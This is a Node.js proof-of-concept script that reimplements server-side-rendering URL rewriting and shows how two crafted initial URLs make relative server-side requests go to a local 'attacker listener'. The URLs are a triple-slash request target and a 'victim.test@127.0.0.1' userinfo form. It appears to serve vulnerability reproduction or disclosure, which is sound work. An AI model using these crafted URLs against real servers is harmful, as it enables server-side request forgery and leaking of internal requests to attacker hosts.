import http from 'node:http';

function parseUrl(urlStr, origin) {
  if (URL.canParse(urlStr)) {
    return new URL(urlStr);
  }

  if (urlStr && urlStr[0] !== '/') {
    urlStr = `/${urlStr}`;
  }

  return new URL(origin + urlStr);
}

function serverHttpRelativeRewrite(requestUrl, platformLocation) {
  const {href, protocol, hostname, port} = platformLocation;
  if (!protocol.startsWith('http')) {
    return requestUrl;
  }

  let urlPrefix = `${protocol}//${hostname}`;
  if (port) {
    urlPrefix += `:${port}`;
  }

  const baseHref = platformLocation.baseHref || href;
  const baseUrl = new URL(baseHref, urlPrefix);
  return new URL(requestUrl, baseUrl).toString();
}

function platformLocationFromInitialConfig(initialUrl, documentOrigin) {
  const parsed = parseUrl(initialUrl, documentOrigin);
  return {
    href: parsed.href,
    protocol: parsed.protocol,
    hostname: parsed.hostname,
    port: parsed.port,
    pathname: parsed.pathname,
    search: parsed.search,
    hash: parsed.hash,
    baseHref: '',
  };
}

function listenOnce() {
  const hits = [];
  const server = http.createServer((req, res) => {
    hits.push({method: req.method, url: req.url, host: req.headers.host});
    res.writeHead(200, {'content-type': 'text/plain'});
    res.end('attacker-listener-ok');
  });

  return new Promise((resolve, reject) => {
    server.once('error', reject);
    server.listen(0, '127.0.0.1', () => {
      resolve({server, hits, port: server.address().port});
    });
  });
}

async function oneHttpGet(url) {
  return new Promise((resolve, reject) => {
    const request = http.get(url, (response) => {
      let body = '';
      response.setEncoding('utf8');
      response.on('data', (chunk) => {
        body += chunk;
      });
      response.on('end', () => {
        resolve({status: response.statusCode, body});
      });
    });
    request.once('error', reject);
  });
}

const {server, hits, port} = await listenOnce();

try {
  const documentOrigin = 'http://victim.test';

  const malformedRequestTargetUrl = `http:///127.0.0.1:${port}/ssr-entry`;
  const locFromMalformedTarget = platformLocationFromInitialConfig(
    malformedRequestTargetUrl,
    documentOrigin,
  );
  const rewrittenFromMalformedTarget = serverHttpRelativeRewrite(
    '/internal-marker',
    locFromMalformedTarget,
  );
  const fetch1 = await oneHttpGet(rewrittenFromMalformedTarget);

  const legacyHostHeaderUrl = `http://victim.test@127.0.0.1:${port}/legacy-entry`;
  const locFromLegacyHost = platformLocationFromInitialConfig(legacyHostHeaderUrl, documentOrigin);
  const rewrittenFromLegacyHost = serverHttpRelativeRewrite('/legacy-marker', locFromLegacyHost);
  const fetch2 = await oneHttpGet(rewrittenFromLegacyHost);

  console.log(JSON.stringify(
    {
      malformedRequestTarget: {
        initialUrl: malformedRequestTargetUrl,
        platformOrigin: `${locFromMalformedTarget.protocol}//${locFromMalformedTarget.hostname}:${locFromMalformedTarget.port}`,
        rewrittenRelativeHttpClientUrl: rewrittenFromMalformedTarget,
        fetch: fetch1,
      },
      legacyHostHeaderPattern: {
        initialUrl: legacyHostHeaderUrl,
        platformOrigin: `${locFromLegacyHost.protocol}//${locFromLegacyHost.hostname}:${locFromLegacyHost.port}`,
        rewrittenRelativeHttpClientUrl: rewrittenFromLegacyHost,
        fetch: fetch2,
      },
      listenerHits: hits,
    },
    null,
    2,
  ));
} finally {
  server.close();
}
